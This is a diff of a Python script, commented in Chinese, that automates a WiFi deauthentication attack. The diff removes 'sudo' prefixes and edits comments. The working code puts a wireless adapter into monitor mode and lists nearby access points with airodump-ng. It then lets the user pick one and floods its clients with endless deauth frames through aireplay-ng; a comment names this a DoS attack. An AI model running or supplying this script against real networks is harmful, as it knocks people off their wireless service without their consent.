@@ -1,12 +1,9 @@
 import subprocess
 import re
 import csv
-# 导入os，检查sudo
 import os
 import time
-# 如果找到任何.csv文件，移动该文件夹中的.csv文件。
 import shutil
-# 为.csv文件名创建时间戳
 from datetime import datetime
 
 # 创建一个空列表
@@ -87,15 +84,15 @@ print("WiFi适配器已连接！\n现在杀死冲突的进程:")
 
 # 使用airmon-ng杀死所有冲突的进程
 
-kill_confilict_processes =  subprocess.run(["sudo", "airmon-ng", "check", "kill"])
+kill_confilict_processes =  subprocess.run(["airmon-ng", "check", "kill"])
 
 # 将网卡置于监听模式
 print("将Wifi适配器置于监听模式:")
-put_in_monitored_mode = subprocess.run(["sudo", "airmon-ng", "start", hacknic])
+put_in_monitored_mode = subprocess.run(["airmon-ng", "start", hacknic])
 
-# 发现访问点
+# 发现无线热点
 
-discover_access_points = subprocess.Popen(["sudo", "airodump-ng","-w" ,"file","--write-interval", "1","--output-format", "csv", check_wifi_result[0] + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+discover_access_points = subprocess.Popen(["airodump-ng","-w" ,"file","--write-interval", "1","--output-format", "csv", check_wifi_result[0] + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 # 循环显示无线访问点，按ctrl-c退出循环
 try:
@@ -126,7 +123,6 @@ try:
         print("___|\t___________________|\t_______|\t______________________________|")
         for index, item in enumerate(active_wireless_networks):
             print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
-        # 在加载更新的列表之前，让脚本休眠1秒钟。
         time.sleep(1)
 
 except KeyboardInterrupt:
@@ -145,10 +141,10 @@ while True:
 hackbssid = active_wireless_networks[int(choice)]["BSSID"]
 hackchannel = active_wireless_networks[int(choice)]["channel"].strip()
 
-# 切换到要对其执行DOS攻击的频道，将其设置为该通道。
+# 切换到要对其执行DOS攻击的信道，将其设置为该信道。
 subprocess.run(["airmon-ng", "start", hacknic + "mon", hackchannel])
 
-# 取消对客户端的身份验证。
+# 取消对客户端的身份验证攻击。
 subprocess.run(["aireplay-ng", "--deauth", "0", "-a", hackbssid, check_wifi_result[int(wifi_interface_choice)] + "mon"])
 
 
